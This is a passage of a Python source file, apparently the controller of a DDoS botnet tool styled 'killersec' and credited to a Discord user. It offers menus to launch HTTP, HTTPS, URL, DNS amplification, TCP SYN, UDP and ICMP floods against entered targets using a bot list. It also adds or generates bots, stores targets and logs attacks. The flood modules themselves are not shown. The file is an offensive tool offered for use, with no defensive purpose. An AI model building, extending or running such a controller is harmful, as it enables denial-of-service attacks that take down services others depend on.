            start_attack(target, settings, bots)
            log_attack(attack_type, target, settings, status="completed", details={"message": "HTTPS Flood finished"})
        except ImportError:
            print(RED + "  [!] Error: https_flood.py not found in layer7 folder" + RESET)
            log_attack(attack_type, target, settings, status="failed", details={"error": "https_flood.py not found"})
    elif attack_type == "DNS Amplification":
        try:
            sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'layer7'))
            from dns_amplification import start_attack
            start_attack(target, settings, bots)
            log_attack(attack_type, target, settings, status="completed", details={"message": "DNS Amplification finished"})
        except ImportError:
            print(RED + "  [!] Error: dns_amplification.py not found in layer7 folder" + RESET)
            log_attack(attack_type, target, settings, status="failed", details={"error": "dns_amplification.py not found"})
    elif attack_type == "URL Flood":
        try:
            sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'layer7'))
            from url_flood import start_attack
            start_attack(target, settings, bots)
            log_attack(attack_type, target, settings, status="completed", details={"message": "URL Flood finished"})
        except ImportError:
            print(RED + "  [!] Error: url_flood.py not found in layer7 folder" + RESET)
            log_attack(attack_type, target, settings, status="failed", details={"error": "url_flood.py not found"})

def run_layer4_attack(attack_type, target, settings, bots):
    print()
    print("  " + RED + "ATTACK INITIATED" + RESET)
    print()
    print("  " + GRAY + f"Attack Type: " + RESET + f"{attack_type}")
    print("  " + GRAY + f"Target: " + RESET + f"{target}")
    print("  " + GRAY + f"Duration: " + RESET + f"{settings['duration']}s")
    print("  " + GRAY + f"Threads: " + RESET + f"{settings['threads']}")
    print("  " + GRAY + f"Active Bots: " + RESET + f"{len(bots)}")
    print("  " + GRAY + f"Delay: " + RESET + f"{settings['delay']}ms")
    print("  " + GRAY + f"Live RPS: " + RESET + f"Updating every second")
    print()

    log_attack(attack_type, target, settings, status="started")

    if attack_type == "TCP Flood (SYN)":
        try:
            sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'layer4'))
            from tcp_syn_flood import start_attack
            start_attack(target, settings, bots)
            log_attack(attack_type, target, settings, status="completed", details={"message": "TCP SYN Flood finished"})
        except ImportError:
            print(RED + "  [!] Error: tcp_syn_flood.py not found in layer4 folder" + RESET)
            log_attack(attack_type, target, settings, status="failed", details={"error": "tcp_syn_flood.py not found"})
    elif attack_type == "UDP Flood":
        try:
            sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'layer4'))
            from udp_flood import start_attack
            start_attack(target, settings, bots)
            log_attack(attack_type, target, settings, status="completed", details={"message": "UDP Flood finished"})
        except ImportError:
            print(RED + "  [!] Error: udp_flood.py not found in layer4 folder" + RESET)
            log_attack(attack_type, target, settings, status="failed", details={"error": "udp_flood.py not found"})
    elif attack_type == "ICMP Flood":
        try:
            sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'layer4'))
            from icmp_flood import start_attack
            start_attack(target, settings, bots)
            log_attack(attack_type, target, settings, status="completed", details={"message": "ICMP Flood finished"})
        except ImportError:
            print(RED + "  [!] Error: icmp_flood.py not found in layer4 folder" + RESET)
            log_attack(attack_type, target, settings, status="failed", details={"error": "icmp_flood.py not found"})

def main():
    print()
    print_loading("Initializing botnet controller...", 0.5)
    print_loading("Loading credentials...", 0.3)
    print_loading("Connecting to database...", 0.3)
    print()

    username = login()
    if not username:
        sys.exit(1)

    print()
    print_loading("Loading botnet...", 0.5)
    bots = load_botnet_bots()
    print_loading(f"Connected {len(bots)} bots", 0.3)
    print()

    while True:
        print_header()
        print_botnet_status(username, len(bots))
        print_layer_menu()

        print("\n  " + GRAY + "┌──(" + RED + "root" + GRAY + "㉿" + GRAY + "killersec" + GRAY + ")-[~]" + RESET)
        choice = input("  " + GRAY + "└─" + RED + "$" + RESET + " ").strip()

        if choice == "1":
            while True:
                print_layer7_menu()
                print("\n  " + GRAY + "┌──(" + RED + "root" + GRAY + "㉿" + GRAY + "killersec" + GRAY + ")-[~]" + RESET)
                l7_choice = input("  " + GRAY + "└─" + RED + "$" + RESET + " ").strip()

                if l7_choice == "5":
                    break
                elif l7_choice in ["1", "2", "3", "4"]:
                    attack_types = {
                        "1": "HTTP Flood",
                        "2": "HTTPS Flood",
                        "3": "DNS Amplification",
                        "4": "URL Flood"
                    }
                    attack_type = attack_types[l7_choice]

                    target = get_target_info()
                    if not target:
                        continue

                    settings = get_attack_settings()
                    if not settings:
                        continue

                    run_layer7_attack(attack_type, target, settings, bots)

                    input("\n  ➤ " + GRAY + "Press Enter to continue..." + RESET)
                else:
                    print("\n" + RED + "  [!] Invalid option!" + RESET)

        elif choice == "2":
            while True:
                print_layer4_menu()
                print("\n  " + GRAY + "┌──(" + RED + "root" + GRAY + "㉿" + GRAY + "killersec" + GRAY + ")-[~]" + RESET)
                l4_choice = input("  " + GRAY + "└─" + RED + "$" + RESET + " ").strip()

                if l4_choice == "4":
                    break
                elif l4_choice in ["1", "2", "3"]:
                    attack_types = {
                        "1": "TCP Flood (SYN)",
                        "2": "UDP Flood",
                        "3": "ICMP Flood"
                    }
                    attack_type = attack_types[l4_choice]

                    target = get_target_info()
                    if not target:
                        continue

                    settings = get_attack_settings()
                    if not settings:
                        continue

                    run_layer4_attack(attack_type, target, settings, bots)

                    input("\n  ➤ " + GRAY + "Press Enter to continue..." + RESET)
                else:
                    print("\n" + RED + "  [!] Invalid option!" + RESET)

        elif choice == "3":
            while True:
                print_botnet_menu()
                print("\n  " + GRAY + "┌──(" + RED + "root" + GRAY + "㉿" + GRAY + "killersec" + GRAY + ")-[~]" + RESET)
                bot_choice = input("  " + GRAY + "└─" + RED + "$" + RESET + " ").strip()

                if bot_choice == "1":
                    print()
                    print()
                    bot_ip = input("  ➤ " + GRAY + "Enter bot IP: " + RESET).strip()
                    if bot_ip:
                        bots.append({"ip": bot_ip, "status": "online", "location": "Unknown", "latency": 0})
                        print()
                        print_loading(f"Adding bot {bot_ip}...", 0.3)
                        print("  " + RED + "✓" + RESET + f" Bot {bot_ip} added successfully!")
                        save_botnet_bots(bots)
                        print_botnet_status(username, len(bots))
                elif bot_choice == "2":
                    print()
                    print("  " + RED + "GENERATE CUSTOM BOTS" + RESET)
                    print()
                    try:
                        count = int(input("  ➤ " + GRAY + "Enter number of bots to generate: " + RESET).strip())
                        if count < 1:
                            print("\n" + RED + "  [!] Error: Number must be at least 1!" + RESET)
                        elif count > 1000:
                            print("\n" + RED + "  [!] Warning: Generating more than 1000 bots may take time..." + RESET)
                            confirm = input("  ➤ " + GRAY + "Continue? (y/n): " + RESET).strip().lower()
                            if confirm == 'y':
                                print()
                                print("  " + RED + "GENERATING RANDOM BOTS" + RESET)
                                print()
                                new_bots = generate_random_bots(count)
                                bots.extend(new_bots)
                                save_botnet_bots(bots)
                                print(f"  {RED}[+] {len(new_bots)} random bots generated and added!{RESET}")
                                for bot in new_bots:
                                    print(f"  {GRAY}  + {bot['ip']} - {bot['status']}{RESET}")
                                print_botnet_status(username, len(bots))
                        else:
                            print()
                            print("  " + RED + "GENERATING RANDOM BOTS" + RESET)
                            print()
                            print_loading(f"Generating {count} bots...", 0.5)
                            new_bots = generate_random_bots(count)
                            bots.extend(new_bots)
                            save_botnet_bots(bots)
                            print("  " + RED + "✓" + RESET + f" {len(new_bots)} random bots generated!")
                            for bot in new_bots:
                                print(f"  {GRAY}  + {bot['ip']} - {bot['status']}{RESET}")
                            print_botnet_status(username, len(bots))
                    except ValueError:
                        print("\n" + RED + "  [!] Error: Please enter a valid number!" + RESET)
                elif bot_choice == "3":
                    print()
                    print("  " + RED + "GENERATING RANDOM BOTS" + RESET)
                    print()
                    print_loading("Generating 5 bots...", 0.5)
                    new_bots = generate_random_bots(5)
                    bots.extend(new_bots)
                    save_botnet_bots(bots)
                    print("  " + RED + "✓" + RESET + f" {len(new_bots)} random bots generated!")
                    for bot in new_bots:
                        print(f"  {GRAY}  + {bot['ip']} - {bot['status']}{RESET}")
                    print_botnet_status(username, len(bots))
                elif bot_choice == "4":
                    print()
                    print("  " + RED + "SYNC BOTS FROM bot.py" + RESET)
                    print()
                    bots = load_botnet_bots()
                    print(f"  {RED}[+] Loaded {len(bots)} bots from botnet_bots.json{RESET}")
                    print_botnet_status(username, len(bots))
                elif bot_choice == "5":
                    print()
                    print("  " + RED + "BOT LIST" + RESET)
                    print()
                    if bots:
                        print("  " + GRAY + "Connected Bots:" + RESET)
                        for i, bot in enumerate(bots, 1):
                            location = bot.get('location', 'Unknown')
                            latency = bot.get('latency', 0)
                            print(f"  {i}. {bot['ip']} - {bot['status']} - {location} - {latency}ms")
                    else:
                        print("\n" + RED + "  [!] No bots connected" + RESET)
                elif bot_choice == "6":
                    print()
                    print("  " + RED + "REMOVE BOT" + RESET)
                    print()
                    if bots:
                        print("  " + GRAY + "Select bot to remove:" + RESET)
                        for i, bot in enumerate(bots, 1):
                            print(f"  {i}. {bot['ip']}")
                        try:
                            bot_num = int(input("  ➤ " + GRAY + "Enter bot number to remove: " + RESET))
                            if 1 <= bot_num <= len(bots):
                                removed = bots.pop(bot_num - 1)
                                save_botnet_bots(bots)
                                print("\n" + GRAY + f"  [-] Bot {removed['ip']} removed" + RESET)
                                print_botnet_status(username, len(bots))
                        except ValueError:
                            print("\n" + RED + "  [!] Invalid input" + RESET)
                    else:
                        print("\n" + RED + "  [!] No bots to remove" + RESET)
                elif bot_choice == "7":
                    print()
                    print("  " + RED + "BOT STATISTICS" + RESET)
                    print()
                    print("  " + GRAY + f"Total Bots: " + RESET + f"{len(bots)}")
                    print("  " + GRAY + f"Online Bots: " + RESET + f"{sum(1 for b in bots if b['status'] == 'online')}")
                    print("  " + GRAY + f"Offline Bots: " + RESET + f"{sum(1 for b in bots if b['status'] == 'offline')}")
                elif bot_choice == "8":
                    break
                else:
                    print("\n" + RED + "  [!] Invalid option!" + RESET)

                input("\n  ➤ " + GRAY + "Press Enter to continue..." + RESET)

        elif choice == "4":
            while True:
                print()
                print("  " + RED + "TARGET MANAGEMENT" + RESET)
                print()
                print("    1. List Saved Targets")
                print("    2. Remove Target")
                print("    3. Clear All Targets")
                print("    4. Back to Main Menu")
                print()

                print("\n  " + GRAY + "┌──(" + RED + "root" + GRAY + "㉿" + GRAY + "killersec" + GRAY + ")-[~]" + RESET)
                tm_choice = input("  " + GRAY + "└─" + RED + "$" + RESET + " ").strip()

                if tm_choice == "1":
                    print()
                    print("  " + RED + "SAVED TARGETS" + RESET)
                    print()
                    targets = list_saved_targets()
                    if targets:
                        for i, t in enumerate(targets, 1):
                            print(f"  {GRAY} {i}.{RESET} {t.get('url', 'N/A')}")
                            print(f"     {GRAY}Host: {RESET} {t.get('host', 'N/A')}")
                            print(f"     {GRAY}Port: {RESET} {t.get('port', 'N/A')}")
                    else:
                        print("  " + RED + "  [!] No saved targets" + RESET)
                elif tm_choice == "2":
                    print()
                    print("  " + RED + "REMOVE TARGET" + RESET)
                    print()
                    targets = list_saved_targets()
                    if targets:
                        for i, t in enumerate(targets, 1):
                            print(f"  {i}. {t.get('url', 'N/A')}")
                        try:
                            idx = int(input("  ➤ " + GRAY + "Enter target number to remove: " + RESET)) - 1
                            if 0 <= idx < len(targets):
                                targets.pop(idx)
                                with open(TARGETS_FILE, 'w') as f:
                                    json.dump(targets, f, indent=2)
                                print(f"  {RED}[+] Target removed{RESET}")
                        except ValueError:
                            print("  " + RED + "  [!] Invalid input" + RESET)
                    else:
                        print("  " + RED + "  [!] No targets to remove" + RESET)
                elif tm_choice == "3":
                    print()
                    confirm = input("  ➤ " + GRAY + "Clear all saved targets? (y/n): " + RESET).strip().lower()
                    if confirm == 'y':
                        with open(TARGETS_FILE, 'w') as f:
                            json.dump([], f)
                        print(f"  {RED}[+] All targets cleared{RESET}")
                elif tm_choice == "4":
                    break
                else:
                    print("\n" + RED + "  [!] Invalid option!" + RESET)

                input("\n  ➤ " + GRAY + "Press Enter to continue..." + RESET)

        elif choice == "5":
            while True:
                print()
                print("  " + RED + "ATTACK LOGS" + RESET)
                print()
                print("    1. View Recent Logs")
                print("    2. Export Logs")
                print("    3. Clear Logs")
                print("    4. Back to Main Menu")
                print()

                print("\n  " + GRAY + "┌──(" + RED + "root" + GRAY + "㉿" + GRAY + "killersec" + GRAY + ")-[~]" + RESET)
                log_choice = input("  " + GRAY + "└─" + RED + "$" + RESET + " ").strip()

                if log_choice == "1":
                    print()
                    print("  " + RED + "RECENT ATTACK LOGS" + RESET)
                    print()
                    logs = get_attack_logs()
                    if logs:
                        print(f"  {GRAY}Total log entries: {len(logs)}{RESET}")
                        print()
                        for i, log in enumerate(logs[-20:], 1):
                            print(f"  {GRAY}[{i}]{RESET} {RED}{log['timestamp']}{RESET}")
                            print(f"     {GRAY}Type:{RESET} {log['attack_type']}")
                            print(f"     {GRAY}Target:{RESET} {log['target']}")
                            print(f"     {GRAY}Status:{RESET} {log['status']}")
                            if 'requests' in log['settings']:
                                print(f"     {GRAY}Requests:{RESET} {log['settings']['requests']}")
                            print(f"     {GRAY}Duration:{RESET} {log['settings']['duration']}s")
                            if log.get('details'):
                                print(f"     {GRAY}Details:{RESET} {log['details']}")
                            print()
                    else:
                        print("  " + RED + "  [!] No attack logs found" + RESET)
                    input("\n  ➤ " + GRAY + "Press Enter to continue..." + RESET)
                elif log_choice == "2":
                    print()
                    print("  " + RED + "EXPORT LOGS" + RESET)
                    print()
                    export_logs()
                    input("\n  ➤ " + GRAY + "Press Enter to continue..." + RESET)
                elif log_choice == "3":
                    print()
                    print("  " + RED + "CLEAR LOGS" + RESET)
                    print()
                    confirm = input("  ➤ " + GRAY + "Clear all logs? (y/n): " + RESET).strip().lower()
                    if confirm == 'y':
                        clear_logs()
                    input("\n  ➤ " + GRAY + "Press Enter to continue..." + RESET)
                elif log_choice == "4":
                    break
                else:
                    print("\n" + RED + "  [!] Invalid option!" + RESET)

        elif choice == "6":
            print()
            print("  " + RED + "CONTACT" + RESET)
            print()
            print("  " + GRAY + "Discord: @ripper.sec" + RESET)
            print("  " + GRAY + "Creator: ripper.sec" + RESET)
            print()
            input("  ➤ " + GRAY + "Press Enter to continue..." + RESET)

        elif choice == "7":
            print()
            print("  " + RED + "SHUTDOWN" + RESET)
            print()
            print("  " + GRAY + "Botnet controller shutting down..." + RESET)
            update_online_users(username, action="remove")
            break

        else:
            print("\n" + RED + "  [!] Invalid option!" + RESET)

if __name__ == "__main__":
    main()
